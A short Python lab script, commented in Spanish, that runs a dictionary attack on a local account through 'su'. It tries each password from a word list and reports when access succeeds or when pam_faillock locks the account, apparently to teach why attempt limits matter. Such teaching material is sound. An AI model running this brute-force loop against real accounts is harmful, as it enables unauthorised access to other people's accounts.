#!/usr/bin/env python3
"""Recorre diccionario.txt probando contrasenas contra "su alumno" en el laboratorio.

Muestra que, sin limite de intentos, un diccionario local termina encontrando una
contrasena debil, y que pam_faillock corta el ataque al bloquear la cuenta.
Ejecutar como un usuario sin privilegios:  su docente -c "python3 pam_attack.py"
"""
import os
import subprocess
import sys

USUARIO = sys.argv[1] if len(sys.argv) > 1 else "alumno"
DIR = os.path.dirname(os.path.abspath(__file__))
claves = [l.strip() for l in open(os.path.join(DIR, "diccionario.txt")) if l.strip()]


def probar(clave):
    """Intenta "su USUARIO" con `clave`. Devuelve (exito, mensaje)."""
    # su normalmente lee la contrasena de la terminal; en este laboratorio alcanza
    # con enviarsela por la entrada estandar para automatizar el ataque.
    r = subprocess.run(
        ["su", USUARIO, "-c", "echo ACCESO_OK"],
        input=clave + "\n",
        capture_output=True, text=True,
    )
    salida = (r.stdout + r.stderr)
    return "ACCESO_OK" in r.stdout, salida


print(f"Probando contrasenas contra 'su {USUARIO}' con {len(claves)} entradas del diccionario")
for i, clave in enumerate(claves, 1):
    ok, salida = probar(clave)
    if ok:
        print(f"   intento {i:2}: {clave:10} -> ACCESO: la contrasena de {USUARIO} es '{clave}'")
        break
    detalle = "cuenta BLOQUEADA" if "locked" in salida.lower() else "fallo"
    print(f"   intento {i:2}: {clave:10} -> {detalle}")
    if "locked" in salida.lower():
        print("   El ataque se detiene: pam_faillock bloqueo la cuenta.")
        break
else:
    print("   No se obtuvo acceso.")
